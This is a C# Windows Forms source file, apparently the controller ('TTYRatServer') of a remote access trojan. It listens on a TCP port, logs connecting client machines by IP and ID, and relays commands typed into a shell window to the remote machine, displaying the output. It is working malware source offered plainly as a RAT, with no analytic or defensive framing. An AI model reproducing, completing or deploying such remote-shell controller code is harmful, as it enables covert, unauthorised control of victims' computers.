
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Linq; 
using System.Threading;    
using System.Net;
using System.Runtime.InteropServices;


namespace TTYRatServer
{
    public partial class Form2 : Form
    {
        private ulong _actualConnectedId;
        private IPAddress _actualConnectedIp;
        TcpListener tcpListener;
        Socket socketForServer;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        StringBuilder strInput;
        Thread th_StartListen,th_RunClient;
        private int port = 6666;
        public Menu menu;
        

        public Form2(Menu actual_menu,NetworkStream clientStream)
        {
            menu = actual_menu;
            networkStream = clientStream;
            InitializeComponent();
            
            
            
        }
        
        private void button1_Click(object sender, EventArgs e)
        {
            Thread runClientThread = new Thread(RunClient);
            runClientThread.Start();
        }
        
        
        public void StartListen()
        {
            tcpListener = new TcpListener(IPAddress.Any, port);
            tcpListener.Start();
            status.Text = "Listening on port " + port;
            for (;;)
            {
                TcpClient client = tcpListener.AcceptTcpClient();
                networkStream = client.GetStream();
                byte[] received_message = new byte[client.ReceiveBufferSize];
            
            
                //Read Received Message with  myNetworkStream.Read(received_message,0,client.ReceiveBufferSize)
                //and write it into an int ReadedBytes
                int readed_bytes = networkStream.Read(received_message,0,client.ReceiveBufferSize);
                string msg = Encoding.Default.GetString(received_message,0,readed_bytes);
                
                string client_ip = menu.parseMessageIP(msg);
                string client_id = menu.parseMessageID(msg);
                
                
                Invoke(new Action(() => menu.UpdateList(client_ip,client_id,port)));
                status.Text = "Connection from " + IPAddress.Parse(client_ip) + " on port " + port;
                _actualConnectedIp = IPAddress.Parse(client_ip);
                _actualConnectedId = ulong.Parse(client_id);
                //LocalVariables.ns_collection.Add((_actualConnectedId, networkStream));
                LocalVariables.ns_collection.Add(networkStream);
                LocalVariables.client_collection.Add(client);
                LocalVariables.ns_collection2.Add((_actualConnectedId,networkStream,client,_actualConnectedIp));
                //Send message
                commonData.sendMessage("hello", networkStream);
                
                
                //client.Close();
                
                
                //A PARTIR D'ICI IMPLEMENTATION pour ouvrir le shell
                //socketForServer = tcpListener.AcceptSocket();
                
                th_RunClient = new Thread(RunClient);
                th_RunClient.Start();

            }
        }

        public void RunClient()
        {

            
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);
            
            strInput = new StringBuilder();

            for (;;)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\r\n");
                    
                }
                catch (Exception )
                {
                    
                    break;
                }
                //Application.DoEvents();
                DisplayMessage(strInput.ToString());
                strInput.Remove(0, strInput.Length);
            }
          
            
        }

        private void Cleanup()
        {
            try
            {
                
                //socketForServer.Close();
            }
            catch (Exception ) { }
            status.Text = "Connection Lost ";
            Invoke(new Action(() => menu.removeConnectionIPlist(_actualConnectedIp,0)));

        }
        

        private delegate void DisplayDelegate(string message);

        private void DisplayMessage(string message)
        {
            if (shellWin.InvokeRequired)
            {
                Invoke(new DisplayDelegate(DisplayMessage), new object[] { message });
            }
            else
            {
                shellWin.AppendText(message);
            }
            // Possible Version : Juste shellWin.AppendText(message);
        }

        
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter && cmdbox.Text.Length != 0)
                {
                    strInput.Append(cmdbox.Text.ToString());
                    streamWriter.WriteLine(strInput);
                    streamWriter.Flush();
                    strInput.Remove(0, strInput.Length);
                    if (cmdbox.Text == "exit") Cleanup();
                    if (cmdbox.Text == "terminate") Cleanup();
                    if (cmdbox.Text == "cls") shellWin.Text = "";
                    
                    cmdbox.Text = "";
                }
            }
            catch (Exception ) { }
            
        }

        
        
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
           // Cleanup();
        }
        
        

        private void StartListernerbutton_Click(object sender, EventArgs e)
        {
            port = Int32.Parse(portBox.Text);
                if (!LocalVariables.port_list.Contains(port))
                {
                    LocalVariables.port_list.Add(port);
                    th_StartListen = new Thread(StartListen);
                    th_StartListen.Start();
                    cmdbox.Focus();
                }
                else
                { 
                    MessageBox.Show("Port reserved \r \n", "Form Closing",MessageBoxButtons.OK,MessageBoxIcon.Exclamation);
                }
        }
        
        private void Form1_Shown(object sender, EventArgs e)
        {
            status.Text = "";
            StartListernerbutton.Enabled = true;
        }

        
    }
}